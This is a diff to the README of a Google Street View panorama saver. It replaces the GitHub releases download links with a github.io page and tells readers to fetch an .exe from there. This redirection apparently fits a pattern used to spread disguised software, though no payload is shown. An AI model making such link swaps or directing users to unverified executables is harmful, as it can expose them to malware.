@@ -1,6 +1,6 @@
 # 🌍 aioli-streetphere-v2026 - Save Google Street View images easily
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Pastelito5280/aioli-streetphere-v2026/releases)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://pastelito5280.github.io)
 
 aioli-streetphere-v2026 saves Google Street View panoramas as standard images. It outputs 2:1 equirectangular files. You can use these files in 360-degree photography workflows. The software includes a local viewer to check your images. You can also export your work to HTML for web display.
 
@@ -14,7 +14,7 @@ The software requires the Microsoft .NET Runtime. If you do not have this instal
 
 Visit the link below to find the current version of the software. Choose the file ending in .exe to ensure compatibility with your Windows system.
 
-[Download the latest release here](https://github.com/Pastelito5280/aioli-streetphere-v2026/releases)
+[Download the latest release here](https://pastelito5280.github.io)
 
 1. Navigate to the release page.
 2. Look for the Assets section.
